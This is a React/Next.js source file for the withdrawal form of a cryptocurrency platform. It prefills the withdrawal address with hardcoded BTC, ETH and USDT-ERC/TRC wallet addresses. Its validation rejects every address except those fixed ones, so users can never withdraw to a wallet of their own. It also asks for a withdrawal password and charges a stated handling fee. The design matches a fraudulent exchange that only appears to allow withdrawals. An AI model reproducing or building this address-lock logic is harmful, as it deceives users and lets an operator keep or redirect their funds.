"use client";

import Button from "@/components/Form/Button";
import FormInput from "@/components/Form/FormInput";
import { ArrowLeft, BookMarked } from "lucide-react";
import Image from "next/image";
import Link from "next/link";
import { useEffect, useRef, useState } from "react"; // Import useEffect

import FormPassword from "@/components/Form/FormPassword";
import { marketDataAssets } from "@/constant/marketArr";
import { AmountWithCommas } from "@/lib/utils";
import DWStore from "@/store/DWStore";
import UserStore from "@/store/UserStore";
import { useRouter, useSearchParams } from "next/navigation";
import toast from "react-hot-toast";

function WithdrawApply() {
  const navigate = useRouter();
  const searchParams = useSearchParams();
  const coin = searchParams.get("coin");
  const fileInputRef = useRef(null);
  const { UserData, GetAccountBalanceRequest, AccountBalance } = UserStore();
  const { WithdrawRequestApi } = DWStore();
  const [withdrawAmount, setWithdrawAmount] = useState("");
  const [withdrawPassword, setWithdrawPassword] = useState("");
  const [walletAddress, setWalletAddress] = useState(""); // New state for wallet address
  const [amountError, setAmountError] = useState("");
  const [passwordError, setPasswordError] = useState("");
  const [addressError, setAddressError] = useState(""); // New state for address error
  // Define default wallet addresses
  const defaultAddresses = {
    btc: "bc1qe8gf05j258tlla2jzqkwh8jma8szxk2nfp8k5a",
    eth: "0x5B09c8F8D9C39d70e052B8c062A953f51ba75CB5",
    "usdt-erc": "0x5B09c8F8D9C39d70e052B8c062A953f51ba75CB5",
    "usdt-trc": "TEk3My3UGQh4FENTeB6jtKgASeR9eFaebj",
  };

  let currentBalance = 0;
  console.log(AccountBalance)
  if (AccountBalance && coin) {
    if (coin === "btc") {
      currentBalance = AccountBalance.BTC?.available;
    } else if (coin === "eth") {
      currentBalance = AccountBalance.ETH?.available;
    } else if (coin === "usdt") {
      currentBalance = AccountBalance.USDT?.available;
    }
    // } else if (coin === "usdt-erc" || coin === "usdt-trc") {
    //   currentBalance = AccountBalance.USDT?.available;
    // }
  }

  // Set default wallet address when coin changes or on initial load
  useEffect(() => {
    if (coin && defaultAddresses[coin]) {
      setWalletAddress(defaultAddresses[coin]);
    }
  }, [coin]);

  useEffect(() => {
    GetAccountBalanceRequest();
  }, []);

  const handleClick = () => {
    fileInputRef.current?.click();
  };

  const handlePaste = async () => {
    try {
      const text = await navigator.clipboard.readText();
      setWalletAddress(text);
      setAddressError("");
    } catch (err) {
      toast.error("Failed to paste from clipboard");
    }
  };

  const handleFileChange = (e) => {
    const file = e.target.files[0];
    console.log("Selected file:", file);
    // You can show a preview or handle upload here
  };

  const handleSubmit = async () => {
    // Reset previous errors
    setAmountError("");
    setPasswordError("");
    setAddressError(""); // Clear address error

    let hasError = false;

    // Validate withdrawAmount
    if (!withdrawAmount || parseFloat(withdrawAmount) <= 0) {
      setAmountError("Please enter a valid withdrawal amount.");
      hasError = true;
    }

    // Validate withdrawPassword
    if (!withdrawPassword) {
      setPasswordError("Please enter your withdrawal password.");
      hasError = true;
    } else if (withdrawPassword.length < 6) {
      // Example: minimum 6 characters
      setPasswordError("Password must be at least 6 characters long.");
      hasError = true;
    }

    // Validate wallet address
    const expectedAddress = defaultAddresses[coin];
    if (walletAddress !== expectedAddress) {
      setAddressError(`Please insert the right wallet address for ${coin.toUpperCase()}.`);
      toast.error(`Please insert the right wallet address for ${coin.toUpperCase()}.`);
      hasError = true;
    }

    if (hasError) {
      return;
    }

    const payload = {
      currency: coin.toUpperCase(),
      amount: parseFloat(withdrawAmount),
      crypto_address: walletAddress, // Use the walletAddress state here
      withdraw_password: withdrawPassword,
    };
    const res = await WithdrawRequestApi(payload);
    if (res.status === 400) {
      toast.error(res.response.data["message"]);
    } else if (res.status === 403) {
      toast.error(res.response.data["message"]);
    } else if (res.status === 201) {
      setWithdrawAmount("");
      setWithdrawPassword("");
      navigate.push("/withdraw-order");
    }
  };


  const currentCoin = marketDataAssets.find((item) => item.name.toLowerCase() === coin);

  return (
    <div className="container py-[60px]">
      <div className="flex items-center justify-between mb-5">
        <h4 className="text-xl lg:text-3xl font-semibold dark:text-white text-black mb-4 flex gap-x-3">
          <button onClick={() => window.history.back()}>
            {" "}
            <ArrowLeft className="pt-1 cursor-pointer" />{" "}
          </button>
          Withdrawal <span className="uppercase">{coin}</span>
        </h4>

        <Link
          prefetch
          href="/withdraw-order"
          className="flex items-center gap-x-1 lg:text-xl font-semibold border border-primary-100 p-[2px_10px] lg:p-[5px_15px] rounded hover:border-primary-200 duration-300 mt-[-10px] lg:mt0 dark:text-white"
        >
          History <BookMarked className="mt-1" />
        </Link>
      </div>

      <div className="max-w-4xl mx-auto rounded-xl overflow-hidden shadow-lg py-5 px-2 lg:p-5">
        <div className="border-b pb-10 mb-10 border-gray-200 dark:border-gray-700 text-center">
          <h4 className="text-6xl mb-2 dark:text-white text-black font-semibold">
            {AmountWithCommas(currentBalance || 0, coin)}
          </h4>
          <p className="text-black dark:text-white font-medium">
            Available Balance(<span className="uppercase">{coin}</span>)
          </p>
        </div>

        <div className="mb-4">
          <label className="text-lg mb-2 block dark:text-white font-medium">
            Withdrawal currency ({coin})
          </label>
          <div
            className={
              "w-full h-13 rounded pl-4 bg-gray-100 dark:bg-gray-800 flex items-center gap-x-4 font-semibold"
            }
          >
            <Image
              src={
                currentCoin?.icon
              }
              width={25}
              height={25}
              alt="coin"
            />{" "}
            <h4 className="uppercase dark:text-white">{coin}</h4>
          </div>
        </div>

        <div className="relative">
          <FormInput
            label="Withdrawal Amount"
            placeholder="Please enter"
            className="mb-5"
            type="number"
            value={withdrawAmount} // Bind value to state
            onChange={(e) => {
              setWithdrawAmount(e.target.value);
              setAmountError(""); // Clear error when typing
            }}
          />
          {amountError && (
            <p className="text-red-500 text-sm mt-1 absolute -bottom-1 left-0">{amountError}</p>
          )}
          <span className="absolute right-3 text-lg bottom-[30px] text-primary-200 font-semibold">
            Max
          </span>
        </div>

        <div className="relative">
          <FormInput
            label="Withdrawal address"
            placeholder="Please enter"
            value={walletAddress} // Bind value to new walletAddress state
            onChange={(e) => {
              setWalletAddress(e.target.value);
              setAddressError(""); // Clear error when typing
            }}
          />
          <button
            type="button"
            onClick={handlePaste}
            className="absolute right-3 bottom-3 text-primary-200 font-semibold hover:text-primary-300 transition-colors"
          >
            Paste
          </button>
        </div>
        {addressError && <p className="text-red-500 text-sm">{addressError}</p>}

        <FormPassword
          label="Withdrawal Password"
          placeholder={"Enter Password"}
          value={withdrawPassword} // Bind value to state
          onChange={(e) => {
            setWithdrawPassword(e.target.value);
            setPasswordError(""); // Clear error when typing
          }}
          className={"mt-5"}
        />
        {passwordError && <p className="text-red-500 text-sm mt-1">{passwordError}</p>}

        <p className="mt-5 dark:text-white">
          If you don't have password then go to this link,{" "}
          <Link
            prefetch
            href={"set-fund-password"}
            className="underline text-blue-500 hover:text-blue-600 duration-300"
          >
            Set Password
          </Link>
        </p>

        <p className="my-5 dark:text-white">
          Kind remeber: Withdrawal will incur a partial handling fee, which will be received within
          24 hours after withdrawal. If you have any questions, please{" "}
          <span className="underline text-primary-100">Contact Customer Service</span>
        </p>

        <p className="dark:text-white">
          Handling fees: <span className="font-semibold">10USD</span>
        </p>

        <Button text="Confirm Withdrawal" className={"mt-5"} handleFunc={handleSubmit} />
      </div>
    </div>
  );
}

export default WithdrawApply;
